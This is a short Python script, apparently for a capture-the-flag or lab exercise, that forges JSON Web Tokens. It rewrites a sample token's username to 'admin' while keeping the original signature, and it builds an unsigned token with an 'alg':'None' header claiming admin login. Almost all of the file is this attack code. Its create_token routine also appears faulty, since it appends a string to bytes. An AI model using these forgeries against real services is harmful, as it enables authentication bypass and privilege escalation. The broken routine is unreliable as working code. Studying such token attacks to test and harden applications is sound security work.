import base64

def padding(part):
    if len(part) % 4 != 0:
        padding = 4 - (len(part)%4)
        return part + "=" * padding
    return part

def decode(jwt):
	particles = jwt.split(".")
	header = base64.b64decode(padding(particles[0])).decode("utf-8")
	body = base64.b64decode(padding(particles[1])).decode("utf-8")
	return header +"." + body

def create_token():
    jwt_header = base64.b64encode(b'{"alg":"None","typ":"JWS"}')
    jwt_body = base64.b64encode(b'{"login":"admin","iat":"1588517209"}')
    jwt_header = padding(jwt_header)
    jwt_body = padding(jwt_body)
    print(jwt_header.decode("utf-8") , "." , jwt_body.decode("utf-8") , ".")


jwt_token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6InBvb24iLCJpYXQiOjE1ODg2OTk2Mjl9.R0FhrZ_dhwnzFLD5ohZrDDHadQ0PE0kf930g3p_vm94"


particles = jwt_token.split(".")
body = base64.b64decode(padding(particles[1])).decode("utf-8")
body = body.replace("poon", "admin")
payload = particles[0] + "." + base64.b64encode(body.encode()).decode().rstrip("=")
print("---- original ----")
print(decode(jwt_token))
print(jwt_token)
new_token = payload + "." + particles[2]
print("---- new ----")
print(new_token)
print(decode(new_token))


